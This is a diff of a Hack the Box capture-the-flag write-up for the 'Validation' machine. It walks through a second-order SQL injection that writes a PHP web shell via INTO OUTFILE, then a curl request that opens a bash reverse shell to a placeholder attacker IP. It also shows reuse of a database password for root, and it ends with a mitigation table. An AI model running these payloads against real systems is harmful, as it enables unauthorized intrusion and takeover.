@@ -1,10 +1,10 @@
 --- 
 title: "Hack the Box (HTB) - Validation"
-description: "Exploiting asdfasdf"
+description: "Exploiting Second-Order SQL Injection"
 date: 2024-07-13 12:00:00 -100
 image: /assets/images/HTB - Validation Pics/Validation_Thumbnail.png
 categories: [CTF]
-tags: [grpc, sql injection,port forwarding, ssh, privilege escalation,]    # TAG names should always be lowercase
+tags: [sql injection, privilege escalation, password reuse]    # TAG names should always be lowercase
 ---
 
 ## Enumeration
@@ -61,7 +61,7 @@ The error went away once we commented out the rest of the query. This confirms t
 
 Let's enumerate the number of columns by adding a simple union select statement 
 
-```bash
+```SQL
 username=Jigsaw94&country=Brazil' union select  1-- -
 ```
 
@@ -71,7 +71,66 @@ No error, which confirms that we only have on column
 
 With this we can now use the union select to insert a php shell 
 
-```bash
-Brazil' UNION SELECT "<?php SYSTEM($_REQUEST)['cmd']); ?>" INTO OUTFILE '/var/www/html/pwned.php
+```PHP / SQL
+Brazil' UNION SELECT '<?php system($_REQUEST["cmd"]); ?>' INTO OUTFILE '/var/www/html/pwned.php'-- -
 ```
-This PHP one-liner 
+
+- `system()` PHP function used to execute shell commands
+- `$_REQUEST["cmd"]` PHP superglobal variable that grabs the value of cmd parameter from the HTTP request
+- `INTO OUTFILE` writes the query to a file
+-  `-- -` comment out the remaining SQL
+
+Our SQL statement will take the value of our HTTP request and write it to `pwned.php`
+
+After submitting the payload, we will need to visit `/account.php`. Our payload won't trigger until we load that, which makes this a [Second-Order SQL Injection](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)
+
+![Pwned PHP Uploaded](/assets/images/HTB%20-%20Validation%20Pics/Pwned%20php.png)
+
+We see another error but this is due to the fact that our query did not return any columns or rows. We should be able to navigate to `pwned.php` and verify that our injection worked
+
+![CMD1](/assets/images/HTB%20-%20Validation%20Pics/CMD1.png)
+
+It looks like it works. The error is only due to the fact that we did not supply a command
+
+![CMD2](/assets/images/HTB%20-%20Validation%20Pics/CMD2.png)
+
+With this confirmation of RCE. Let's curl a shell request. We'll set up our `nc` listener and enter the following curl command
+
+```bash
+curl -X POST http://10.10.11.116/pwned.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<YOURIP>/PORT 0>&1"'
+```
+![Shell Obtained](/assets/images/HTB%20-%20Validation%20Pics/Shell%20Obtained.png)
+
+We have our shell. Since python is not installed on t his container I am going to use the following to upgrade to a pty
+
+```bash
+script -q /dev/null
+```
+
+![Upgraded shell](/assets/images/HTB%20-%20Validation%20Pics/Upgraded%20shell.png)
+
+We immediately notice a `config.php` file. This is gold, let's take a look
+
+![Config.php](/assets/images/HTB%20-%20Validation%20Pics/password.png)
+
+We see a password `uhc-9qual-global-pw` here, let's try switching to root with this
+
+![Root](/assets/images/HTB%20-%20Validation%20Pics/Root.png)
+
+GG, we've obtained root on this box
+
+
+
+## Vulnerabilities & Mitigation Summary
+
+| Vulnerability     | Mitigation            |
+|-------------------|-----------------------|
+| Static Cookies Assigned by Username  | Use secure, ephemeral, randomly generated session identifiers |
+| Use of Deprecated Hash (MD5) | Use a stronger hash function like SHA-256 or bcrypt|
+| SQL Injection     | Validate and sanitize user input. Use prepared statements|
+| Password Reuse | Don't reuse passwords!
+
+### Remediation References
+
+- [OWASP Secure Cookie Practices](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#secure-cookies)
+- [Second-Order SQL Injection](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)
